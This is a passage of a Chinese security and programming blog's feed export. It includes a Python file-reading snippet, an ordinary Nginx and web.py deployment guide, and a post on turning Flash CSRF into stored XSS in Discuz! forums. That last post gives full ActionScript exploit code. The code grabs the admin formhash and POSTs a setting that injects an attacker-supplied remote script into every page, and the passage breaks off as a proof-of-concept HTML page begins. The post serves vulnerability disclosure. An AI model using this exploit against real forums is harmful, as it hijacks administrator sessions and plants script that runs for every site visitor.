方法，会导致不可预测的内存占用。好的方法是利用固定长度的缓冲区来不断读取文件内容。通过 yield，我们不再需要编写读文件的迭代类，就可以轻松实现文件读取：&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;def read_file(fpath):&lt;br&gt;    BLOCK_SIZE = 1024&lt;br&gt;    with open(fpath, ‘rb’) as f:&lt;br&gt;        while True:&lt;br&gt;            block = f.read(BLOCK_SIZE)&lt;br&gt;            if block:&lt;br&gt;                yield block&lt;br&gt;            else:&lt;br&gt;                return&lt;br&gt;```&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;with&quot;&gt;&lt;a href=&quot;#with&quot; class=&quot;headerlink&quot; title=&quot;with&quot;&gt;&lt;/a&gt;with&lt;/h2&gt;&lt;p&gt;使用 with 语句操作文件对象&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;with open(&amp;quot;/etc/passwd&amp;quot;) as f:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    for line in f:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        print line&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;相当于：
    
    </summary>
    
      <category term="Program" scheme="http://sh3ll.me/categories/Program/"/>
    
    
  </entry>
  
  <entry>
    <title>Nginx 部署 Web.py</title>
    <link href="http://sh3ll.me/2014/07/20/web-py-on-nginx/"/>
    <id>http://sh3ll.me/2014/07/20/web-py-on-nginx/</id>
    <published>2014-07-20T12:03:31.000Z</published>
    <updated>2016-07-16T09:12:50.038Z</updated>
    
    <content type="html">&lt;h2 id=&quot;需要的包&quot;&gt;&lt;a href=&quot;#需要的包&quot; class=&quot;headerlink&quot; title=&quot;需要的包&quot;&gt;&lt;/a&gt;需要的包&lt;/h2&gt;&lt;p&gt;spawn-fcgi&lt;br&gt;flup&lt;/p&gt;
&lt;h2 id=&quot;Nginx-配置文件&quot;&gt;&lt;a href=&quot;#Nginx-配置文件&quot; class=&quot;headerlink&quot; title=&quot;Nginx 配置文件&quot;&gt;&lt;/a&gt;Nginx 配置文件&lt;/h2&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;server&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        listen 80;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        server_name t.sh3ll.me;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        root /home/wwwroot/web.py;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        location /&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                include fastcgi_params;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                fastcgi_param SCRIPT_FILENAME $fastcgi_script_name;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                fastcgi_param PATH_INFO $fastcgi_script_name;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    fastcgi_pass unix:/tmp/pyweb.sock;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    fastcgi_param SERVER_ADDR $server_addr;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    fastcgi_param SERVER_PORT $server_port;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    fastcgi_param SERVER_NAME $server_name;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        location /static/&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                if (-f $request_filename)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                    rewrite ^/static/(.*)$  /static/$1 break;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                expires 10d;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        access_log  /home/wwwlogs/web.py.log  access;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;Spawn-fcgi&quot;&gt;&lt;a href=&quot;#Spawn-fcgi&quot; class=&quot;headerlink&quot; title=&quot;Spawn-fcgi&quot;&gt;&lt;/a&gt;Spawn-fcgi&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;root@localhost:~# cat startSpawn&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;#!/bin/bash&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;spawn-fcgi -d /home/wwwroot/web.py/ -f /home/wwwroot/web.py/main.py  -s /tmp/pyweb.sock -u www -g www&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;root@localhost:~# cat stopSpawn&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;#!/bin/bash&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;kill `pgrep -f &amp;quot;python /home/wwwroot/web.py/main.py&amp;quot;`&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;Hello-world&quot;&gt;&lt;a href=&quot;#Hello-world&quot; class=&quot;headerlink&quot; title=&quot;Hello, world!&quot;&gt;&lt;/a&gt;Hello, world!&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;#!/usr/bin/env python&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;# -*- coding: utf-8 -*-&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;import web&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;urls = (&amp;quot;/.*&amp;quot;, &amp;quot;hello&amp;quot;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;app = web.application(urls, globals())&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;class hello:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    def GET(self):&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        return &amp;apos;Hello, world!&amp;apos;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;if __name__ == &amp;quot;__main__&amp;quot;:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    web.wsgi.runwsgi = lambda func, addr=None: web.wsgi.runfcgi(func, addr) #此行必须有&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    app.run()&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;运行&quot;&gt;&lt;a href=&quot;#运行&quot; class=&quot;headerlink&quot; title=&quot;运行&quot;&gt;&lt;/a&gt;运行&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;root@localhost:~# ./lnmp start&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;=========================================================================&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Manager for LNMP V1.1  ,  Written by Licess&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;=========================================================================&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;LNMP is a tool to auto-compile &amp;amp; install Nginx+MySQL+PHP on Linux&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;This script is a tool to Manage status of lnmp&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;For more information please visit http://www.lnmp.org&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Usage: /root/lnmp &amp;#123;start|stop|reload|restart|kill|status&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;=========================================================================&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Starting LNMP...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Starting nginx...  done&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Starting php-fpm  done&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Starting MySQL&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.. *&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;root@localhost:~# ./startSpawn&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;spawn-fcgi: child spawned successfully: PID: 3370&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;需要的包&quot;&gt;&lt;a href=&quot;#需要的包&quot; class=&quot;headerlink&quot; title=&quot;需要的包&quot;&gt;&lt;/a&gt;需要的包&lt;/h2&gt;&lt;p&gt;spawn-fcgi&lt;br&gt;flup&lt;/p&gt;
&lt;h2 id=&quot;Nginx-配置文件&quot;&gt;&lt;a href=&quot;#Nginx-配置文件&quot; class=&quot;headerlink&quot; title=&quot;Nginx 配置文件&quot;&gt;&lt;/a&gt;Nginx 配置文件&lt;/h2&gt;
    
    </summary>
    
      <category term="Program" scheme="http://sh3ll.me/categories/Program/"/>
    
    
  </entry>
  
  <entry>
    <title>Discuz! Flash CSRF To Stored XSS</title>
    <link href="http://sh3ll.me/2014/07/02/discuz-flash-csrf-to-xss/"/>
    <id>http://sh3ll.me/2014/07/02/discuz-flash-csrf-to-xss/</id>
    <published>2014-07-02T14:02:11.000Z</published>
    <updated>2016-07-16T09:12:50.038Z</updated>
    
    <content type="html">&lt;p&gt;Discuz! 的crossdomain.xml 一直是个大问题，默认的crossdomain.xml如下：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;cross-domain-policy&amp;gt; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;lt;allow-access-from domain=&amp;quot;*&amp;quot; /&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;/cross-domain-policy&amp;gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这里，allow-access-from domain被设置成了 * ，意味着任意站点的 flash 文件都可以对 dz 站点发起 http 请求。 &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;br&gt;而 discuz 后台的操作只验证了referer头（因为flash可以进行 http 请求，所以对 token 的验证可以 bypass ），referer 头可以通过从 https 站点向 http 站点访问绕过。更有甚者，有一些神奇的插件，使得我们可以访问到上传到 discuz 站点的 flash 文件，直接免去了 referer 头的问题。&lt;br&gt;后台的 “全局 － 站点信息 － 网站第三方统计代码” 处，可以通过 script 标签引入js，前台访问直接触发，相当于构造了一枚完美的存储型 xss。&lt;br&gt;以上 3 点，导致了 flash csrf 向存储型 xss 的转变。&lt;/p&gt;
&lt;p&gt;首先，编写用于发送请求的 flash，as3 代码如下：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;35&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;36&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;37&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;38&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;39&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;40&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;41&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;42&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;43&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;44&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;45&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;46&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;47&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;48&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;49&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;50&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;51&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;52&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;53&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;54&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;55&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;56&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;57&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;58&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;59&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;60&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;package&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        import flash.display.Sprite;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        import flash.events.Event;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        import flash.external.ExternalInterface;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        import flash.net.URLLoader;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        import flash.net.URLRequest;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        import flash.net.URLRequestMethod;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        public class discuz extends Sprite&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                var url:String = root.loaderInfo.parameters[&amp;quot;url&amp;quot;];&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                var scriptSrc:String = root.loaderInfo.parameters[&amp;quot;src&amp;quot;];&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                public function discuz()&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                        var urlHash:String = url + &amp;quot;admin.php?action=setting&amp;amp;operation=basic&amp;quot;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                        get(urlHash);           &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                private function get(url):void &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                        /*HTTP GET&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                        *@url, 要请求的 URL&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                        */&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                        var loader:URLLoader = new URLLoader();&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                        loader.addEventListener(Event.COMPLETE, getFormHash);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                        var request:URLRequest = new URLRequest(url);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                        loader.load(request);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                private function post(url, data):void &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                        /*HTTP POST&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                        *@url, 要请求的 URL&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                        *@data, POST 的数据&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                        */&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                        var loader:URLLoader = new URLLoader();&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                        var request:URLRequest = new URLRequest(url);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                        request.method = URLRequestMethod.POST;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                        request.data = data;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                        loader.load(request);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                private function getFormHash(event:Event):void&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                        //获取formhash 后回调，写js.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                        var loader:URLLoader = URLLoader(event.target);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                        var pattern:RegExp = /&amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;formhash&amp;quot; value=&amp;quot;(\w&amp;#123;8&amp;#125;)&amp;quot; \/&amp;gt;/;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                        var formhash = pattern.exec(loader.data)[1];&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                        var urlPost:String = url + &amp;quot;admin.php&amp;quot;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                        var script = &amp;quot;&amp;lt;script src=&amp;apos;&amp;quot; + scriptSrc +&amp;quot;&amp;apos;&amp;gt;&amp;lt;/script&amp;gt;&amp;quot;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                        var data = &amp;quot;action=setting&amp;amp;edit=yes&amp;amp;formhash=&amp;quot;+formhash+&amp;quot;&amp;amp;scrolltop=%0d&amp;amp;anchor=%0d&amp;amp;operation=basic&amp;quot;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                        data += &amp;quot;&amp;amp;settingnew%5bbbname%5d=Discuz%21+Board&amp;amp;settingnew%5bsitename%5d=Comsenz+Inc.&amp;amp;settingnew%&amp;quot;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                        data += &amp;quot;5bsiteurl%5d=http%3a%2f%2fwww.comsenz.com%2f&amp;amp;settingnew%5badminemail%5d=admin@admin.com&amp;amp;s&amp;quot;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                        data += &amp;quot;ettingnew%5bsite_qq%5d=%0d&amp;amp;settingnew%5bicp%5d=%0d&amp;amp;settingnew%5bboardlicensed%5d=0&amp;amp;settin&amp;quot;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                        data += &amp;quot;gnew%5bstatcode%5d=&amp;quot;+script+&amp;quot;&amp;amp;settingnew%5bbbclosed%5d=0&amp;amp;settingnew%5bclosedreason%5d=%0d&amp;quot;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                        data += &amp;quot;&amp;amp;settingnew%5bclosedallowactivation%5d=0&amp;amp;settingsubmit=%cc%e1%bd%bb&amp;quot;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                        post(urlPost, data);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;利用页面poc.html：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;html&amp;gt;&lt;/div&gt;&lt;div 